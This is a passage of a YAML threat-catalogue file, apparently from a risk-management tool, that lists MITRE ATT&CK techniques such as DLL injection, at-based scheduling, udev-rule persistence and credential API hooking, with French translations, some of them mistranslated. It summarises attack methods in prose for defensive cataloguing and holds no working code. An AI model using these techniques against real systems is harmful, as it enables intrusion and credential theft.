  - urn: urn:intuitem:risk:threat:mitre-attack:t1124
    ref_id: T1124
    name: System Time Discovery
    description: "An adversary may gather the system time and/or time zone settings\
      \ from a local or remote system. The system time is set and stored by services,\
      \ such as the Windows Time Service on Windows or <code>systemsetup</code> on\
      \ macOS.(Citation: MSDN System Time)(Citation: Technet Windows Time Service)(Citation:\
      \ systemsetup mac time) These time settings may also be synchronized between\
      \ systems and services in an enterprise network, typically accomplished with\
      \ a network time server within a domain.(Citation: Mac Time Sync)(Citation:\
      \ linux system time)\n\nSystem time information may be gathered in a number\
      \ of ways, such as with [Net](https://attack.mitre.org/software/S0039) on Windows\
      \ by performing <code>net time \\\\hostname</code> to gather the system time\
      \ on a remote system. The victim's time zone may also be inferred from the current\
      \ system time or gathered by using <code>w32tm /tz</code>.(Citation: Technet\
      \ Windows Time Service) In addition, adversaries can discover device uptime\
      \ through functions such as <code>GetTickCount()</code> to determine how long\
      \ it has been since the system booted up.(Citation: Virtualization/Sandbox Evasion)\n\
      \nOn network devices, [Network Device CLI](https://attack.mitre.org/techniques/T1059/008)\
      \ commands such as `show clock detail` can be used to see the current time configuration.(Citation:\
      \ show_clock_detail_cisco_cmd)\n\nIn addition, system calls \u2013 such as <code>time()</code>\
      \ \u2013 have been used to collect the current time on Linux devices.(Citation:\
      \ MAGNET GOBLIN) On macOS systems, adversaries may use commands such as <code>systemsetup\
      \ -gettimezone</code> or <code>timeIntervalSinceNow</code> to gather current\
      \ time zone information or current date and time.(Citation: System Information\
      \ Discovery Technique)(Citation: ESET DazzleSpy Jan 2022)\n\nThis information\
      \ could be useful for performing other techniques, such as executing a file\
      \ with a [Scheduled Task/Job](https://attack.mitre.org/techniques/T1053)(Citation:\
      \ RSA EU12 They're Inside), or to discover locality information based on time\
      \ zone to assist in victim targeting (i.e. [System Location Discovery](https://attack.mitre.org/techniques/T1614)).\
      \ Adversaries may also use knowledge of system time as part of a time bomb,\
      \ or delaying execution until a specified date/time.(Citation: AnyRun TimeBomb)\n\
      https://attack.mitre.org/techniques/T1124"
    translations:
      fr:
        name: "D\xE9couverte de l\u2019heure syst\xE8me"
        description: "Un adversaire peut collecter les param\xE8tres d\u2019heure\
          \ et/ou de fuseau horaire du syst\xE8me \xE0 partir d\u2019un syst\xE8me\
          \ local ou distant. L\u2019heure syst\xE8me est d\xE9finie et stock\xE9\
          e par des services, tels que le service de temps Windows sur Windows ou\
          \ <code>systemsetup</code> sur macOS. (citation : heure syst\xE8me MSDN)(Citation\
          \ : Technet Windows Time Service)(Citation : systemsetup mac time) Ces param\xE8\
          tres de temps peuvent \xE9galement \xEAtre synchronis\xE9s entre les syst\xE8\
          mes et les services d\u2019un r\xE9seau d\u2019entreprise, g\xE9n\xE9ralement\
          \ avec un serveur de temps r\xE9seau au sein d\u2019un domaine. (Citation\
          \ : Synchronisation de l\u2019heure Mac)(Citation : heure syst\xE8me linux)\n\
          \nLes informations de temps syst\xE8me peuvent \xEAtre collect\xE9es de\
          \ plusieurs fa\xE7ons, par exemple avec [Net](https://attack.mitre.org/software/S0039)\
          \ sous Windows en effectuant net <code>time \\\\hostname</code> pour collecter\
          \ le temps syst\xE8me sur un syst\xE8me distant. Le fuseau horaire de la\
          \ victime peut \xE9galement \xEAtre d\xE9duit de l\u2019heure actuelle du\
          \ syst\xE8me ou collect\xE9 \xE0 l\u2019aide de <code>w32tm /tz</code>.\
          \ (Citation : Technet Windows Time Service) En outre, les adversaires peuvent\
          \ d\xE9couvrir le temps de fonctionnement de l\u2019appareil gr\xE2ce \xE0\
          \ des fonctions telles que <code>GetTickCount()</code> pour d\xE9terminer\
          \ combien de temps s\u2019est \xE9coul\xE9 depuis le d\xE9marrage du syst\xE8\
          me. (Citation : Virtualisation/\xC9vasion du bac \xE0 sable)\n\nSur les\
          \ p\xE9riph\xE9riques r\xE9seau, les commandes [Network Device CLI](https://attack.mitre.org/techniques/T1059/008)\
          \ telles que 'show clock detail' peuvent \xEAtre utilis\xE9es pour voir\
          \ la configuration actuelle de l\u2019heure. (R\xE9f\xE9rence : show_clock_detail_cisco_cmd)\n\
          \nDe plus, les appels syst\xE8me - tels que <code>time()</code> - ont \xE9\
          t\xE9 utilis\xE9s pour collecter l\u2019heure actuelle sur les appareils\
          \ Linux. (Citation : GOBELIN MAGN\xC9TIQUE) Sur les syst\xE8mes macOS, les\
          \ adversaires peuvent utiliser des commandes telles que <code>systemsetup\
          \ -gettimezone</code> ou <code>timeIntervalSinceNow</code> pour recueillir\
          \ des informations sur le fuseau horaire actuel ou la date et l\u2019heure\
          \ actuelles. (Citation : Technique de d\xE9couverte d\u2019informations\
          \ syst\xE8me)(Citation : ESET DazzleSpy janvier 2022)\n\nCes informations\
          \ peuvent \xEAtre utiles pour ex\xE9cuter d\u2019autres techniques, telles\
          \ que l\u2019ex\xE9cution d\u2019un fichier avec une [T\xE2che planifi\xE9\
          e](https://attack.mitre.org/techniques/T1053)(Citation : RSA EU12 Ils sont\
          \ \xE0 l\u2019int\xE9rieur), ou pour d\xE9couvrir des informations de localit\xE9\
          \ bas\xE9es sur le fuseau horaire afin d\u2019aider au ciblage des victimes\
          \ (c\u2019est-\xE0-dire [D\xE9couverte de l\u2019emplacement du syst\xE8\
          me](https://attack.mitre.org/techniques/T1614)). Les adversaires peuvent\
          \ \xE9galement utiliser la connaissance du temps syst\xE8me dans le cadre\
          \ d\u2019une bombe \xE0 retardement, ou retarder l\u2019ex\xE9cution jusqu\u2019\
          \xE0 une date ou une heure sp\xE9cifi\xE9e. (Citation : AnyRun TimeBomb)\n\
          https://attack.mitre.org/techniques/T1124"
  - urn: urn:intuitem:risk:threat:mitre-attack:t1053.002
    ref_id: T1053.002
    name: At
    description: 'Adversaries may abuse the [at](https://attack.mitre.org/software/S0110)
      utility to perform task scheduling for initial or recurring execution of malicious
      code. The [at](https://attack.mitre.org/software/S0110) utility exists as an
      executable within Windows, Linux, and macOS for scheduling tasks at a specified
      time and date. Although deprecated in favor of [Scheduled Task](https://attack.mitre.org/techniques/T1053/005)''s
      [schtasks](https://attack.mitre.org/software/S0111) in Windows environments,
      using [at](https://attack.mitre.org/software/S0110) requires that the Task Scheduler
      service be running, and the user to be logged on as a member of the local Administrators
      group. In addition to explicitly running the `at` command, adversaries may also
      schedule a task with [at](https://attack.mitre.org/software/S0110) by directly
      leveraging the [Windows Management Instrumentation](https://attack.mitre.org/techniques/T1047)
      `Win32_ScheduledJob` WMI class.(Citation: Malicious Life by Cybereason)


      On Linux and macOS, [at](https://attack.mitre.org/software/S0110) may be invoked
      by the superuser as well as any users added to the <code>at.allow</code> file.
      If the <code>at.allow</code> file does not exist, the <code>at.deny</code> file
      is checked. Every username not listed in <code>at.deny</code> is allowed to
      invoke [at](https://attack.mitre.org/software/S0110). If the <code>at.deny</code>
      exists and is empty, global use of [at](https://attack.mitre.org/software/S0110)
      is permitted. If neither file exists (which is often the baseline) only the
      superuser is allowed to use [at](https://attack.mitre.org/software/S0110).(Citation:
      Linux at)


      Adversaries may use [at](https://attack.mitre.org/software/S0110) to execute
      programs at system startup or on a scheduled basis for [Persistence](https://attack.mitre.org/tactics/TA0003).
      [at](https://attack.mitre.org/software/S0110) can also be abused to conduct
      remote [Execution](https://attack.mitre.org/tactics/TA0002) as part of [Lateral
      Movement](https://attack.mitre.org/tactics/TA0008) and/or to run a process under
      the context of a specified account (such as SYSTEM).


      In Linux environments, adversaries may also abuse [at](https://attack.mitre.org/software/S0110)
      to break out of restricted environments by using a task to spawn an interactive
      system shell or to run system commands. Similarly, [at](https://attack.mitre.org/software/S0110)
      may also be used for [Privilege Escalation](https://attack.mitre.org/tactics/TA0004)
      if the binary is allowed to run as superuser via <code>sudo</code>.(Citation:
      GTFObins at)

      https://attack.mitre.org/techniques/T1053/002'
    translations:
      fr:
        name: "\xC0"
        description: "Les adversaires peuvent abuser de l\u2019utilitaire [at](https://attack.mitre.org/software/S0110)\
          \ pour effectuer la planification de t\xE2ches en vue de l\u2019ex\xE9cution\
          \ initiale ou r\xE9currente de code malveillant. L\u2019utilitaire [at](https://attack.mitre.org/software/S0110)\
          \ existe en tant qu\u2019ex\xE9cutable dans Windows, Linux et macOS pour\
          \ planifier des t\xE2ches \xE0 une heure et \xE0 une date sp\xE9cifi\xE9\
          es. Bien qu\u2019il soit d\xE9conseill\xE9 en faveur des [schtasks](https://attack.mitre.org/software/S0111)\
          \ de [T\xE2che planifi\xE9e](https://attack.mitre.org/techniques/T1053/005)\
          \ dans les environnements Windows, l\u2019utilisation de [at](https://attack.mitre.org/software/S0110)\
          \ n\xE9cessite que le service Planificateur de t\xE2ches soit en cours d\u2019\
          ex\xE9cution et que l\u2019utilisateur soit connect\xE9 en tant que membre\
          \ du groupe Administrateurs local. En plus d\u2019ex\xE9cuter explicitement\
          \ la commande 'at', les adversaires peuvent \xE9galement planifier une t\xE2\
          che avec [at](https://attack.mitre.org/software/S0110) en exploitant directement\
          \ la classe WMI 'Win32_ScheduledJob' [Windows Management Instrumentation](https://attack.mitre.org/techniques/T1047).(Citation\
          \ : Malicious Life par Cybereason)\n\nSous Linux et macOS, [at](https://attack.mitre.org/software/S0110)\
          \ peut \xEAtre appel\xE9 par le superutilisateur ainsi que par tous les\
          \ utilisateurs ajout\xE9s au fichier <code>at.allow</code>. Si le fichier\
          \ <code>at.allow</code> n\u2019existe pas, le fichier <code>at.deny</code>\
          \ est v\xE9rifi\xE9. Chaque nom d\u2019utilisateur non r\xE9pertori\xE9\
          \ dans <code>at.deny</code> est autoris\xE9 \xE0 invoquer [at](https://attack.mitre.org/software/S0110).\
          \ Si le <code>fichier at.deny</code> existe et est vide, l\u2019utilisation\
          \ globale de [at](https://attack.mitre.org/software/S0110) est autoris\xE9\
          e. Si aucun des deux fichiers n\u2019existe (ce qui est souvent la ligne\
          \ de base), seul le superutilisateur est autoris\xE9 \xE0 utiliser [at](https://attack.mitre.org/software/S0110).\
          \ (Citation : Linux \xE0)\n\nLes adversaires peuvent utiliser [at](https://attack.mitre.org/software/S0110)\
          \ pour ex\xE9cuter des programmes au d\xE9marrage du syst\xE8me ou de mani\xE8\
          re planifi\xE9e pour [Persistence](https://attack.mitre.org/tactics/TA0003).\
          \ [\xE0](https://attack.mitre.org/software/S0110) peuvent \xE9galement \xEA\
          tre utilis\xE9s de mani\xE8re abusive pour effectuer une [Ex\xE9cution](https://attack.mitre.org/tactics/TA0002)\
          \ \xE0 distance dans le cadre d\u2019un [Mouvement lat\xE9ral](https://attack.mitre.org/tactics/TA0008)\
          \ et/ou pour ex\xE9cuter un processus dans le cadre d\u2019un compte sp\xE9\
          cifi\xE9 (tel que SYSTEM).\n\nDans les environnements Linux, les adversaires\
          \ peuvent \xE9galement abuser de [at](https://attack.mitre.org/software/S0110)\
          \ pour sortir d\u2019environnements restreints en utilisant une t\xE2che\
          \ pour g\xE9n\xE9rer un shell syst\xE8me interactif ou pour ex\xE9cuter\
          \ des commandes syst\xE8me. De m\xEAme, [at](https://attack.mitre.org/software/S0110)\
          \ peut \xE9galement \xEAtre utilis\xE9 pour [\xC9l\xE9vation de privil\xE8\
          ges](https://attack.mitre.org/tactics/TA0004) si le binaire est autoris\xE9\
          \ \xE0 s\u2019ex\xE9cuter en tant que superutilisateur via <code>sudo</code>.\
          \ (Citation : go awaybins at)\nhttps://attack.mitre.org/techniques/T1053/002"
  - urn: urn:intuitem:risk:threat:mitre-attack:t1055.001
    ref_id: T1055.001
    name: Dynamic-link Library Injection
    description: "Adversaries may inject dynamic-link libraries (DLLs) into processes\
      \ in order to evade process-based defenses as well as possibly elevate privileges.\
      \ DLL injection is a method of executing arbitrary code in the address space\
      \ of a separate live process.  \n\nDLL injection is commonly performed by writing\
      \ the path to a DLL in the virtual address space of the target process before\
      \ loading the DLL by invoking a new thread. The write can be performed with\
      \ native Windows API calls such as <code>VirtualAllocEx</code> and <code>WriteProcessMemory</code>,\
      \ then invoked with <code>CreateRemoteThread</code> (which calls the <code>LoadLibrary</code>\
      \ API responsible for loading the DLL). (Citation: Elastic Process Injection\
      \ July 2017) \n\nVariations of this method such as reflective DLL injection\
      \ (writing a self-mapping DLL into a process) and memory module (map DLL when\
      \ writing into process) overcome the address relocation issue as well as the\
      \ additional APIs to invoke execution (since these methods load and execute\
      \ the files in memory by manually preforming the function of <code>LoadLibrary</code>).(Citation:\
      \ Elastic HuntingNMemory June 2017)(Citation: Elastic Process Injection July\
      \ 2017) \n\nAnother variation of this method, often referred to as Module Stomping/Overloading\
      \ or DLL Hollowing, may be leveraged to conceal injected code within a process.\
      \ This method involves loading a legitimate DLL into a remote process then manually\
      \ overwriting the module's <code>AddressOfEntryPoint</code> before starting\
      \ a new thread in the target process.(Citation: Module Stomping for Shellcode\
      \ Injection) This variation allows attackers to hide malicious injected code\
      \ by potentially backing its execution with a legitimate DLL file on disk.(Citation:\
      \ Hiding Malicious Code with Module Stomping) \n\nRunning code in the context\
      \ of another process may allow access to the process's memory, system/network\
      \ resources, and possibly elevated privileges. Execution via DLL injection may\
      \ also evade detection from security products since the execution is masked\
      \ under a legitimate process.\nhttps://attack.mitre.org/techniques/T1055/001"
    translations:
      fr:
        name: "Injection de biblioth\xE8que de liens dynamiques"
        description: "Les adversaires peuvent injecter des biblioth\xE8ques de liens\
          \ dynamiques (DLL) dans les processus afin d\u2019\xE9chapper aux d\xE9\
          fenses bas\xE9es sur les processus et \xE9ventuellement d\u2019\xE9lever\
          \ les privil\xE8ges. L\u2019injection DLL est une m\xE9thode d\u2019ex\xE9\
          cution de code arbitraire dans l\u2019espace d\u2019adressage d\u2019un\
          \ processus en direct distinct.  \n\nL\u2019injection de DLL est g\xE9n\xE9\
          ralement effectu\xE9e en \xE9crivant le chemin d\u2019acc\xE8s \xE0 une\
          \ DLL dans l\u2019espace d\u2019adressage virtuel du processus cible avant\
          \ de charger la DLL en appelant un nouveau thread. L\u2019\xE9criture peut\
          \ \xEAtre effectu\xE9e avec des appels d\u2019API Windows natifs tels que\
          \ <code>VirtualAllocEx</code> et <code>WriteProcessMemory</code>, puis appel\xE9\
          e avec <code>CreateRemoteThread</code> (qui appelle l\u2019API <code>LoadLibrary</code>\
          \ responsable du chargement de la DLL). (Citation : Injection de processus\
          \ \xE9lastique juillet 2017) \n\nDes variantes de cette m\xE9thode, telles\
          \ que l\u2019injection de DLL r\xE9fl\xE9chissante (\xE9criture d\u2019\
          une DLL d\u2019auto-mappage dans un processus) et le module de m\xE9moire\
          \ (mappage de DLL lors de l\u2019\xE9criture dans un processus), surmontent\
          \ le probl\xE8me de d\xE9placement d\u2019adresse, ainsi que les API suppl\xE9\
          mentaires pour appeler l\u2019ex\xE9cution (puisque ces m\xE9thodes chargent\
          \ et ex\xE9cutent les fichiers en m\xE9moire en pr\xE9formant manuellement\
          \ la fonction de <code>LoadLibrary</code>). (Citation : Elastic HuntingNMemory\
          \ juin 2017)(Citation : Injection de processus \xE9lastique juillet 2017)\
          \ \n\nUne autre variante de cette m\xE9thode, souvent appel\xE9e module\
          \ stomping/overloading ou DLL Hollowing, peut \xEAtre utilis\xE9e pour dissimuler\
          \ le code inject\xE9 dans un processus. Cette m\xE9thode implique le chargement\
          \ d\u2019une DLL l\xE9gitime dans un processus distant, puis l\u2019\xE9\
          crasement manuel de <code>l\u2019AddressOfEntryPoint</code> du module avant\
          \ de d\xE9marrer un nouveau thread dans le processus cible. (citation :\
          \ pi\xE9tinement du module pour l\u2019injection de shellcode) Cette variante\
          \ permet aux attaquants de masquer le code inject\xE9 malveillant en soutenant\
          \ potentiellement son ex\xE9cution avec un fichier DLL l\xE9gitime sur le\
          \ disque. (Citation : Cacher du code malveillant avec le pi\xE9tinement\
          \ de module) \n\nL\u2019ex\xE9cution de code dans le contexte d\u2019un\
          \ autre processus peut permettre d\u2019acc\xE9der \xE0 la m\xE9moire du\
          \ processus, aux ressources syst\xE8me/r\xE9seau et \xE9ventuellement \xE0\
          \ des privil\xE8ges \xE9lev\xE9s. L\u2019ex\xE9cution par injection DLL\
          \ peut \xE9galement \xE9chapper \xE0 la d\xE9tection des produits de s\xE9\
          curit\xE9, car l\u2019ex\xE9cution est masqu\xE9e dans le cadre d\u2019\
          un processus l\xE9gitime.\nhttps://attack.mitre.org/techniques/T1055/001"
  - urn: urn:intuitem:risk:threat:mitre-attack:t1588.005
    ref_id: T1588.005
    name: Exploits
    description: 'Adversaries may buy, steal, or download exploits that can be used
      during targeting. An exploit takes advantage of a bug or vulnerability in order
      to cause unintended or unanticipated behavior to occur on computer hardware
      or software. Rather than developing their own exploits, an adversary may find/modify
      exploits from online or purchase them from exploit vendors.(Citation: Exploit
      Database)(Citation: TempertonDarkHotel)(Citation: NationsBuying)


      In addition to downloading free exploits from the internet, adversaries may
      purchase exploits from third-party entities. Third-party entities can include
      technology companies that specialize in exploit development, criminal marketplaces
      (including exploit kits), or from individuals.(Citation: PegasusCitizenLab)(Citation:
      Wired SandCat Oct 2019) In addition to purchasing exploits, adversaries may
      steal and repurpose exploits from third-party entities (including other adversaries).(Citation:
      TempertonDarkHotel)


      An adversary may monitor exploit provider forums to understand the state of
      existing, as well as newly discovered, exploits. There is usually a delay between
      when an exploit is discovered and when it is made public. An adversary may target
      the systems of those known to conduct exploit research and development in order
      to gain that knowledge for use during a subsequent operation.


      Adversaries may use exploits during various phases of the adversary lifecycle
      (i.e. [Exploit Public-Facing Application](https://attack.mitre.org/techniques/T1190),
      [Exploitation for Client Execution](https://attack.mitre.org/techniques/T1203),
      [Exploitation for Privilege Escalation](https://attack.mitre.org/techniques/T1068),
      [Exploitation for Defense Evasion](https://attack.mitre.org/techniques/T1211),
      [Exploitation for Credential Access](https://attack.mitre.org/techniques/T1212),
      [Exploitation of Remote Services](https://attack.mitre.org/techniques/T1210),
      and [Application or System Exploitation](https://attack.mitre.org/techniques/T1499/004)).

      https://attack.mitre.org/techniques/T1588/005'
    translations:
      fr:
        name: Exploits
        description: "Les adversaires peuvent acheter, voler ou t\xE9l\xE9charger\
          \ des exploits qui peuvent \xEAtre utilis\xE9s lors du ciblage. Un exploit\
          \ tire parti d\u2019un bogue ou d\u2019une vuln\xE9rabilit\xE9 afin de provoquer\
          \ l\u2019apparition d\u2019un comportement involontaire ou impr\xE9vu sur\
          \ le mat\xE9riel ou les logiciels informatiques. Plut\xF4t que de d\xE9\
          velopper ses propres exploits, un adversaire peut trouver/modifier des exploits\
          \ en ligne ou les acheter aupr\xE8s de fournisseurs d\u2019exploits. (citation\
          \ : base de donn\xE9es d\u2019exploits)(Citation : TempertonDarkHotel)(Citation\
          \ : NationsBuying)\n\nEn plus de t\xE9l\xE9charger des exploits gratuits\
          \ sur Internet, les adversaires peuvent acheter des exploits aupr\xE8s d\u2019\
          entit\xE9s tierces. Il peut s\u2019agir d\u2019entreprises technologiques\
          \ sp\xE9cialis\xE9es dans le d\xE9veloppement d\u2019exploits, de march\xE9\
          s criminels (y compris des kits d\u2019exploitation) ou de particuliers.\
          \ (Citation : PegasusCitizenLab)(Citation : Wired SandCat octobre 2019)\
          \ En plus d\u2019acheter des exploits, les adversaires peuvent voler et\
          \ r\xE9utiliser des exploits d\u2019entit\xE9s tierces (y compris d\u2019\
          autres adversaires). (Citation : TempertonDarkHotel)\n\nUn adversaire peut\
          \ surveiller les forums des fournisseurs d\u2019exploits pour comprendre\
          \ l\u2019\xE9tat des exploits existants et des exploits r\xE9cemment d\xE9\
          couverts. Il y a g\xE9n\xE9ralement un d\xE9lai entre le moment o\xF9 un\
          \ exploit est d\xE9couvert et celui o\xF9 il est rendu public. Un adversaire\
          \ peut cibler les syst\xE8mes de ceux dont on sait qu\u2019ils m\xE8nent\
          \ des activit\xE9s de recherche et de d\xE9veloppement sur l\u2019exploitation\
          \ afin d\u2019obtenir ces connaissances qui seront utilis\xE9es lors d\u2019\
          une op\xE9ration ult\xE9rieure.\n\nLes adversaires peuvent utiliser des\
          \ exploits au cours de diverses phases de leur cycle de vie (c\u2019est-\xE0\
          -dire [Exploiter une application publique](https://attack.mitre.org/techniques/T1190),\
          \ [Exploiter pour l\u2019ex\xE9cution du client](https://attack.mitre.org/techniques/T1203),\
          \ [Exploitation pour l\u2019\xE9l\xE9vation de privil\xE8ges](https://attack.mitre.org/techniques/T1068),\
          \ [Exploitation pour contourner la d\xE9fense](https://attack.mitre.org/techniques/T1211),\
          \ [Exploitation pour l\u2019acc\xE8s aux informations d\u2019identification](\
          \ https://attack.mitre.org/techniques/T1212), [Exploitation de services\
          \ \xE0 distance](https://attack.mitre.org/techniques/T1210) et [Exploitation\
          \ d\u2019applications ou de syst\xE8mes](https://attack.mitre.org/techniques/T1499/004)).\n\
          https://attack.mitre.org/techniques/T1588/005"
  - urn: urn:intuitem:risk:threat:mitre-attack:t1556
    ref_id: T1556
    name: Modify Authentication Process
    description: 'Adversaries may modify authentication mechanisms and processes to
      access user credentials or enable otherwise unwarranted access to accounts.
      The authentication process is handled by mechanisms, such as the Local Security
      Authentication Server (LSASS) process and the Security Accounts Manager (SAM)
      on Windows, pluggable authentication modules (PAM) on Unix-based systems, and
      authorization plugins on MacOS systems, responsible for gathering, storing,
      and validating credentials. By modifying an authentication process, an adversary
      may be able to authenticate to a service or system without using [Valid Accounts](https://attack.mitre.org/techniques/T1078).


      Adversaries may maliciously modify a part of this process to either reveal credentials
      or bypass authentication mechanisms. Compromised credentials or access may be
      used to bypass access controls placed on various resources on systems within
      the network and may even be used for persistent access to remote systems and
      externally available services, such as VPNs, Outlook Web Access and remote desktop.

      https://attack.mitre.org/techniques/T1556'
    translations:
      fr:
        name: "Modifier le processus d\u2019authentification"
        description: "Les adversaires peuvent modifier les m\xE9canismes et les processus\
          \ d\u2019authentification pour acc\xE9der aux informations d\u2019identification\
          \ de l\u2019utilisateur ou permettre un acc\xE8s injustifi\xE9 aux comptes.\
          \ Le processus d\u2019authentification est g\xE9r\xE9 par des m\xE9canismes,\
          \ tels que le processus LSASS (Local Security Authentication Server) et\
          \ le gestionnaire de comptes de s\xE9curit\xE9 (SAM) sous Windows, les modules\
          \ d\u2019authentification enfichables (PAM) sur les syst\xE8mes Unix et\
          \ les plug-ins d\u2019autorisation sur les syst\xE8mes MacOS, charg\xE9\
          s de collecter, de stocker et de valider les informations d\u2019identification.\
          \ En modifiant un processus d\u2019authentification, un adversaire peut\
          \ \xEAtre en mesure de s\u2019authentifier aupr\xE8s d\u2019un service ou\
          \ d\u2019un syst\xE8me sans utiliser [Comptes valides](https://attack.mitre.org/techniques/T1078).\n\
          \nLes adversaires peuvent modifier de mani\xE8re malveillante une partie\
          \ de ce processus pour r\xE9v\xE9ler des informations d\u2019identification\
          \ ou contourner les m\xE9canismes d\u2019authentification. Les informations\
          \ d\u2019identification ou l\u2019acc\xE8s compromis peuvent \xEAtre utilis\xE9\
          s pour contourner les contr\xF4les d\u2019acc\xE8s plac\xE9s sur diverses\
          \ ressources sur les syst\xE8mes du r\xE9seau et peuvent m\xEAme \xEAtre\
          \ utilis\xE9s pour un acc\xE8s persistant \xE0 des syst\xE8mes distants\
          \ et \xE0 des services externes disponibles, tels que les VPN, Outlook Web\
          \ Access et le bureau \xE0 distance.\nhttps://attack.mitre.org/techniques/T1556"
  - urn: urn:intuitem:risk:threat:mitre-attack:t1546.017
    ref_id: T1546.017
    name: Udev Rules
    description: "Adversaries may maintain persistence through executing malicious\
      \ content triggered using udev rules. Udev is the Linux kernel device manager\
      \ that dynamically manages device nodes, handles access to pseudo-device files\
      \ in the `/dev` directory, and responds to hardware events, such as when external\
      \ devices like hard drives or keyboards are plugged in or removed. Udev uses\
      \ rule files with `match keys` to specify the conditions a hardware event must\
      \ meet and `action keys` to define the actions that should follow. Root permissions\
      \ are required to create, modify, or delete rule files located in `/etc/udev/rules.d/`,\
      \ `/run/udev/rules.d/`, `/usr/lib/udev/rules.d/`, `/usr/local/lib/udev/rules.d/`,\
      \ and `/lib/udev/rules.d/`. Rule priority is determined by both directory and\
      \ by the digit prefix in the rule filename.(Citation: Ignacio Udev research\
      \ 2024)(Citation: Elastic Linux Persistence 2024)\n\nAdversaries may abuse the\
      \ udev subsystem by adding or modifying rules in udev rule files to execute\
      \ malicious content. For example, an adversary may configure a rule to execute\
      \ their binary each time the pseudo-device file, such as `/dev/random`, is accessed\
      \ by an application. Although udev is limited to running short tasks and is\
      \ restricted by systemd-udevd's sandbox (blocking network and filesystem access),\
      \ attackers may use scripting commands under the action key `RUN+=` to detach\
      \ and run the malicious content\u2019s process in the background to bypass these\
      \ controls.(Citation: Reichert aon sedexp 2024)\nhttps://attack.mitre.org/techniques/T1546/017"
    translations:
      fr:
        name: "R\xE8gles Udev"
        description: "Les adversaires peuvent maintenir la persistance en ex\xE9cutant\
          \ du contenu malveillant d\xE9clench\xE9 \xE0 l\u2019aide de r\xE8gles udev.\
          \ Udev est le gestionnaire de p\xE9riph\xE9riques du noyau Linux qui g\xE8\
          re dynamiquement les n\u0153uds de p\xE9riph\xE9riques, g\xE8re l\u2019\
          acc\xE8s aux fichiers de pseudo-p\xE9riph\xE9riques dans le r\xE9pertoire\
          \ '/dev' et r\xE9pond aux \xE9v\xE9nements mat\xE9riels, tels que lorsque\
          \ des p\xE9riph\xE9riques externes tels que des disques durs ou des claviers\
          \ sont branch\xE9s ou retir\xE9s. Udev utilise des fichiers de r\xE8gles\
          \ avec des 'cl\xE9s de correspondance' pour sp\xE9cifier les conditions\
          \ qu\u2019un \xE9v\xE9nement mat\xE9riel doit remplir et des 'cl\xE9s d\u2019\
          action' pour d\xE9finir les actions qui doivent suivre. Des autorisations\
          \ root sont requises pour cr\xE9er, modifier ou supprimer des fichiers de\
          \ r\xE8gles situ\xE9s dans '/etc/udev/rules.d/', '/run/udev/rules.d/', '/usr/lib/udev/rules.d/',\
          \ '/usr/local/lib/udev/rules.d/' et '/lib/udev/rules.d/'. La priorit\xE9\
          \ de la r\xE8gle est d\xE9termin\xE9e \xE0 la fois par le r\xE9pertoire\
          \ et par le pr\xE9fixe num\xE9rique dans le nom de fichier de la r\xE8gle.\
          \ (Citation : Recherche Ignacio Udev 2024)(Citation : Persistance d\u2019\
          Elastic Linux 2024)\n\nLes adversaires peuvent abuser du sous-syst\xE8me\
          \ udev en ajoutant ou en modifiant des r\xE8gles dans les fichiers de r\xE8\
          gles udev pour ex\xE9cuter du contenu malveillant. Par exemple, un adversaire\
          \ peut configurer une r\xE8gle pour ex\xE9cuter son fichier binaire chaque\
          \ fois qu\u2019une application acc\xE8de au fichier de pseudo-p\xE9riph\xE9\
          rique, tel que \xAB /dev/random \xBB. Bien que udev soit limit\xE9 \xE0\
          \ l\u2019ex\xE9cution de t\xE2ches courtes et soit limit\xE9 par le bac\
          \ \xE0 sable de systemd-udevd (bloquant l\u2019acc\xE8s au r\xE9seau et\
          \ au syst\xE8me de fichiers), les attaquants peuvent utiliser des commandes\
          \ de script sous la touche d\u2019action 'RUN+=' pour d\xE9tacher et ex\xE9\
          cuter le processus du contenu malveillant en arri\xE8re-plan afin de contourner\
          \ ces contr\xF4les. (Citation : Reichert aon sedexp 2024)\nhttps://attack.mitre.org/techniques/T1546/017"
  - urn: urn:intuitem:risk:threat:mitre-attack:t1056.004
    ref_id: T1056.004
    name: Credential API Hooking
    description: "Adversaries may hook into Windows application programming interface\
      \ (API) functions to collect user credentials. Malicious hooking mechanisms\
      \ may capture API calls that include parameters that reveal user authentication\
      \ credentials.(Citation: Microsoft TrojanSpy:Win32/Ursnif.gen!I Sept 2017) Unlike\
      \ [Keylogging](https://attack.mitre.org/techniques/T1056/001),  this technique\
      \ focuses specifically on API functions that include parameters that reveal\
      \ user credentials. Hooking involves redirecting calls to these functions and\
      \ can be implemented via:\n\n* **Hooks procedures**, which intercept and execute\
      \ designated code in response to events such as messages, keystrokes, and mouse\
      \ inputs.(Citation: Microsoft Hook Overview)(Citation: Elastic Process Injection\
      \ July 2017)\n* **Import address table (IAT) hooking**, which use modifications\
      \ to a process\u2019s IAT, where pointers to imported API functions are stored.(Citation:\
      \ Elastic Process Injection July 2017)(Citation: Adlice Software IAT Hooks Oct\
      \ 2014)(Citation: MWRInfoSecurity Dynamic Hooking 2015)\n* **Inline hooking**,\
      \ which overwrites the first bytes in an API function to redirect code flow.(Citation:\
      \ Elastic Process Injection July 2017)(Citation: HighTech Bridge Inline Hooking\
      \ Sept 2011)(Citation: MWRInfoSecurity Dynamic Hooking 2015)\nhttps://attack.mitre.org/techniques/T1056/004"
    translations:
      fr:
        name: "Accrochage de l\u2019API d\u2019identification"
        description: "Les adversaires peuvent se connecter aux fonctions de l\u2019\
          interface de programmation d\u2019applications (API) Windows pour collecter\
          \ les informations d\u2019identification de l\u2019utilisateur. Des m\xE9\
          canismes d\u2019accrochage malveillants peuvent capturer des appels d\u2019\
          API qui incluent des param\xE8tres r\xE9v\xE9lant les informations d\u2019\
          identification d\u2019authentification de l\u2019utilisateur. (Citation\
          \ : Microsoft TrojanSpy\_:Win32/Ursnif.gen\_! Contrairement \xE0 [Keylogging](https://attack.mitre.org/techniques/T1056/001),\
          \ cette technique se concentre sp\xE9cifiquement sur les fonctions API qui\
          \ incluent des param\xE8tres qui r\xE9v\xE8lent les informations d\u2019\
          identification de l\u2019utilisateur. Le hooking consiste \xE0 rediriger\
          \ les appels vers ces fonctions et peut \xEAtre mis en \u0153uvre via :\n\
          \n* **Proc\xE9dures de hooks**, qui interceptent et ex\xE9cutent le code\
          \ d\xE9sign\xE9 en r\xE9ponse \xE0 des \xE9v\xE9nements tels que des messages,\
          \ des frappes au clavier et des entr\xE9es de souris. (Citation : Pr\xE9\
          sentation de Microsoft Hook)(Citation : Injection de processus \xE9lastique\
          \ juillet 2017)\n* **Accrochage de la table d\u2019adresses d\u2019importation\
